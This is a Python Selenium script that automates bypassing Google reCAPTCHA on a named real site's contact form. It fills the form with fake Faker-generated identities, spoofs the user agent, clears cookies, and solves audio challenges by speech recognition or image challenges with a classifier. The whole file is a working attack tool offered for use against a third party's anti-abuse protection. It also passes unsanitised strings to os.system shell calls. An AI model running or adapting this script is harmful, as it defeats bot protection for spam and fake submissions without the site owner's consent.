from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium import webdriver
from bs4 import BeautifulSoup
from random import uniform
from time import sleep
from faker import Faker
from faker_e164.providers import E164Provider
from scipy.io import wavfile

import sys
import logging
import random
import os
import urllib.request
import time
import audio
import threading
import argparse
import uuid
import image
import ris

# use the max amplitude to filter out pauses
AMP_THRESHOLD = 2500
ATTACK_AUDIO = True
ATTACK_IMAGES = False
CHROMEDRIVER_PATH = "chromedriver.exe"
LEVEL = logging.DEBUG

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("--image", action='store_true', help="attack image recaptcha")
group.add_argument("--audio", action='store_true', help="attack audio recaptcha")
parser.add_argument("--driver", action="store", help="specify custom chromedriver path")
parser.add_argument("--level", action="store", help="set log level", default="debug", choices=("debug", "warning"))

args = parser.parse_args()
ATTACK_IMAGES = args.image
ATTACK_AUDIO = args.audio
CHROMEDRIVER_PATH = args.driver

if not ATTACK_AUDIO and not ATTACK_IMAGES:
    parser.print_help()
    sys.exit()

    
############################## UTIL FUNCTIONS #############################
def init(task_type):
    global TASK_PATH, TASK_DIR, TASK_NUM, TASK
    TASK_DIR = os.path.join(task_type, "task")
    TASK_NUM = 1

    while os.path.isdir(TASK_DIR+str(TASK_NUM)):
        TASK_NUM += 1
    if not os.path.isdir(TASK_DIR+str(TASK_NUM)):
        os.mkdir(TASK_DIR+str(TASK_NUM))
        logging.info("Making "+ TASK_DIR+str(TASK_NUM))
    TASK = "task"+str(TASK_NUM)
    TASK_PATH = os.path.join(task_type, TASK)


def wait_between(a, b):
    rand = uniform(a, b)
    sleep(rand)


############################## IMAGE RECAPTCHA ##############################
CAPTCHA_PATH = "images\\captchas"
TASK_PATH = "images\\taskg"
def should_click_image(img, x1, y1, store, classifier):
    # ans = ris.parse_clarifai(ris.clarifai(img))
    ans = image.predict(img, classifier)
    logging.debug(ans)

    words = classifier.split(' ')
    for elem in ans:
        for word in words:
            if word.lower() in elem.lower() or elem.lower() in word.lower():
                decision = True
                store[(x1,y1)] = True
                logging.debug(store)
                return decision

    return False


def click_tiles(driver, coords):
    orig_srcs, new_srcs = {}, {}
    for (x, y) in coords:
        roundX = round(x)
        roundY = round(y)
        print("[*] Going to click {} {}".format(roundX,roundY))
        tile1 = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//div[@id="rc-imageselect-target"]/table/tbody/tr[{0}]/td[{1}]'.format(roundX, roundY))))
        orig_srcs[(x, y)] = driver.find_element(By.XPATH, "//*[@id=\"rc-imageselect-target\"]/table/tbody/tr[{}]/td[{}]/div/div[1]/img".format(roundX,roundY)).get_attribute("src")
        new_srcs[(x, y)] = orig_srcs[(x, y)] # to check if image has changed
        tile1.click()
        wait_between(0.1, 0.5)

    logging.debug("[*] Downloading new inbound image...")
    new_files = {}
    for (x, y) in orig_srcs:
        roundX = round(x)
        roundY = round(y)
        count = 0 #avoiding infinite loop if no new image was loaded on click
        while new_srcs[(x, y)] == orig_srcs[(x, y)] and count < 3:
            new_srcs[(x, y)] = driver.find_element(By.XPATH, "//*[@id=\"rc-imageselect-target\"]/table/tbody/tr[{}]/td[{}]/div/div[1]/img".format(roundX,roundY)).get_attribute("src")
            time.sleep(0.5)
            count += 1

            if new_srcs[(x, y)] == orig_srcs[(x, y)]:
                urllib.request.urlretrieve(new_srcs[(x, y)], "captcha.jpeg")
                new_path = TASK_PATH+"\\new_output{}{}.jpeg".format(roundX, roundY)
                os.system("mv captcha.jpeg "+new_path)
                new_files[(x, y)] = (new_path)

    return new_files

def handle_queue(to_solve_queue, coor_dict, classifier):
    ts = []
    for (x,y) in to_solve_queue:
        image_file = to_solve_queue[(x, y)]
        t = threading.Thread(target=should_click_image, args=(image_file, x, y,coor_dict, classifier))
        ts.append(t)
        t.start()
    for t in ts:
        t.join()

def cleanup():
    for root, dirs, files in os.walk(TASK_PATH):
        for file in files:
            os.remove(os.path.join(root, file))

def image_recaptcha(driver):
    cleanup()
    continue_solving = True
    while continue_solving:
        willing_to_solve = False
        while not willing_to_solve:
            wait_between(0.2, 0.5)
            body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
            soup = BeautifulSoup(body, 'html.parser')
            table = soup.findAll("div", {"id": "rc-imageselect-target"})[0]
            target = soup.findAll("div", {"class": "rc-imageselect-desc"})
            if not target: # find the target
                target = soup.findAll("div", {"class": "rc-imageselect-desc-no-canonical"})
            target = target[0].findAll("strong")[0].get_text()
            print ("Classifier is: " + target);

            #  Compute shape of captcha & target  #
            trs = table.findAll("tr")
            max_height = len(trs)
            max_width = 0
            for tr in trs:
                imgs = tr.findAll("img")
                payload = imgs[0]["src"]
                if len(imgs) > max_width:
                    max_width = len(imgs)

            #  if its not easy, ask for a new one
            if max_height > 4 or max_width > 4: # lets get an easier one
                reload_captcha = driver.find_element(By.XPATH, "//*[@id=\"recaptcha-reload-button\"]")
                reload_captcha.click()
                wait_between(0.2, 0.5)
            else:
                willing_to_solve = True
        
        #  Pull down captcha to attack and organize directory structure
        urllib.request.urlretrieve(payload, "captcha.jpeg")
        os.system("mv captcha.jpeg "+TASK_PATH+"/full_payload.jpeg")
        os.system("copy "+TASK_PATH+"\\full_payload.jpeg "+CAPTCHA_PATH)
        os.rename(CAPTCHA_PATH+"/full_payload.jpeg", CAPTCHA_PATH+"/"+str(uuid.uuid1())+".jpeg")
        os.system("magick "+TASK_PATH+"/full_payload.jpeg -crop "+str(max_width)+"x"+str(max_height)+"@ +repage +adjoin "+TASK_PATH+"/output_%03d.jpg")

        #  build queue of files
        to_solve_queue = {}

        idx = 0
        files = [TASK_PATH+"\\"+f for f in os.listdir(TASK_PATH) if "output_" in f]
        for f in files:
            y = idx % max_height + 1  # making coordinates 1 indexed to match xpaths
            x = idx / max_width + 1
            to_solve_queue[(x, y)] = f
            idx += 1
        
        logging.debug(to_solve_queue)
        
        coor_dict = {}
        handle_queue(to_solve_queue, coor_dict, target)  # multithread builds out where to click
        logging.debug(coor_dict)
        #os.system("rm "+TASK_PATH+"/full_payload.jpeg")
        
        driver.switch_to.default_content()  
        iframe = driver.find_element(By.XPATH, "/html/body/div/div[4]/iframe")
        driver.switch_to.frame(iframe)
        continue_solving = True 
        while continue_solving:
            to_click_tiles = []
            for coords in coor_dict:
                to_click = coor_dict[coords]
                x, y = coords
                if to_click:
                    to_click_tiles.append((x,y)) # collect all the tiles to click in this round
            new_files = click_tiles(driver, to_click_tiles)
            handle_queue(new_files, coor_dict, target)
            continue_solving = False
            for to_click_tile in coor_dict.values():
                continue_solving = to_click_tile or continue_solving
        driver.find_element(By.ID, "recaptcha-verify-button").click()
        wait_between(0.2, 0.5)
        if driver.find_element_by_class_name("rc-imageselect-incorrect-response").get_attribute("style") != "display: none":
            continue_solving = True
        else:
            print ("Think I'm done here!")

############################## AUDIO RECAPTCHA ##############################
def test_all(start=100, end=101):
    global TASK_PATH
    TASK_TYPE = "data"
    timings = []
    for task_num in range(start, end):
        try:
            TASK = "task"+str(task_num)
            TASK_PATH = TASK_TYPE+"/"+TASK
            AUDIO_FILE = TASK_PATH+"/"+TASK #+ ".mp3"
            num_str, time = get_numbers(AUDIO_FILE, TASK_PATH+"/")
            print(num_str, time)
            timings.append(time)
        except:
            pass
    print (timings)
    print (sum(timings)/float(len(timings)))

def get_numbers(audio_file, parent_dir):
    global AMP_THRESHOLD
    mp3_file = audio_file + ".mp3"
    wav_file = audio_file + ".wav"
    print("converting from " + mp3_file + " to " + wav_file)
    os.system("echo 'y' | ffmpeg -i "+mp3_file+" "+wav_file + "&> /dev/null")
    # split audio file on silence
    os.system("sox -V3 "+wav_file+" "+audio_file+"_.wav silence -l 0 1 0.5 0.1% : newfile : restart &> /dev/null")
    files = [f for f in os.listdir(parent_dir) if "_0" in f]
    audio_filenames = []
    # remove audio files that are only silence
    for f in files:
        _, snd = wavfile.read(TASK_PATH + "/" + f)
        amp = max(snd)
        print(f + ":" + str(amp))
        if amp > AMP_THRESHOLD: # skip this file
            audio_filenames.append(parent_dir+f)
        else:
            os.system("rm " + parent_dir+f)
    # run speech recognition on the individual numbers
    # num_str = ""
    # for f in sorted(audio_filenames):
    #     print f
    #     num_str += str(audio.getNum(f))
    # print(num_str)
    return audio.getNums(TASK_PATH, audio_filenames)

def type_like_bot(driver, element, string):
    driver.find_element(By.ID, element).send_keys(string)
    wait_between(0.5, 2)

def type_like_human(driver, element, string):
    driver.find_element(By.ID, element).click()
    for c in string:
        driver.find_element(By.ID, element).send_keys(c)
        wait_between(0.0, 0.1)
    wait_between(0.5, 2)

type_style = type_like_bot

def fill_out_profile(driver):
    fake = Faker()
    fake.add_provider(E164Provider)

    user = fake.simple_profile()
    username = user["username"]
    email = user["mail"].replace("@", str(random.randint(10000, 99999))+"@")

    wait_between(1, 2)
    type_style(driver, "nume", fake.first_name())
    type_style(driver, "prenume", fake.last_name())
    type_style(driver, "oras", "Vaslui")
    type_style(driver, "telefon", fake.safe_e164(region_code="GB"))
    type_style(driver, "email", email)
    type_style(driver, "mesaj", "#ciaoless")

##############################  MAIN  ##############################
def main():
    logging.basicConfig(stream=sys.stderr, level=LEVEL)
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--disable-bundled-ppapi-flash")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36")
    chrome_options.add_argument("--disable-plugins-discovery")

    
    if CHROMEDRIVER_PATH:
        driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=chrome_options)
        logging.debug("[*] Starting custom chromedriver %s" % CHROMEDRIVER_PATH) 
    else:
        driver = webdriver.Chrome(chrome_options=chrome_options)
        logging.debug("[*] Starting system default chromedriver")
    
    driver = webdriver.Chrome(chrome_options=chrome_options)
    driver.delete_all_cookies()
    agent = driver.execute_script("return navigator.userAgent")
    logging.debug("[*] Cookies cleared")
    logging.debug("[ ] Starting driver with user agent %s" % agent)

    logging.info("[*] Starting attack on Amass's recaptcha")
    driver.get("https://www.amass.ro/contact.html")
    logging.debug("[*] Filling out Contact form")
    fill_out_profile(driver)
    WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")))
    iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")

    driver.delete_all_cookies()
    driver.switch_to.frame(iframeSwitch)
    #ActionChains(driver).move_to_element(iframeSwitch).perform()
    driver.delete_all_cookies()
    logging.info("[*] Recaptcha located. Engaging")
    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
    ele = driver.find_element(By.ID, "recaptcha-anchor")
    #ActionChains(driver).move_to_element(ele).perform()
    ele.click()
    driver.switch_to.default_content()  

    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")))
    iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
    driver.switch_to.frame(iframe)
    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "rc-imageselect")))
    
    if ATTACK_IMAGES:
        image_recaptcha(driver)

    elif ATTACK_AUDIO:
        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-audio-button")))
        time.sleep(1)
        driver.find_element(By.ID, "recaptcha-audio-button").click()

        guess_again = True

        while guess_again:
            init("audio")
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "audio-source")))
            # Parse table details offline
            body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
            soup = BeautifulSoup(body, 'html.parser')
            link = soup.findAll("a", {"class": "rc-audiochallenge-tdownload-link"})[0]
            urllib.request.urlretrieve(link["href"], TASK_PATH + "/" + TASK + ".mp3")
            guess_str = get_numbers(TASK_PATH + "/" + TASK, TASK_PATH + "/")
            type_style(driver, "audio-response", guess_str)
            # results.append(guess_str)
            wait_between(0.5, 3)
            driver.find_element(By.ID, "recaptcha-verify-button").click()
            wait_between(1, 2.5)
            try:
                logging.debug("Checking if Google wants us to solve more...")
                driver.switch_to.default_content()
                driver.switch_to.frame(iframeSwitch)
                checkmark_pos = driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark").get_attribute("style")
                guess_again = not (checkmark_pos == "background-position: 0 -600px")
                driver.switch_to.default_content()
                iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
                driver.switch_to.frame(iframe)
            except Exception as e:
                print (e)
                guess_again = False
  
    input("")
main()
# test_all()
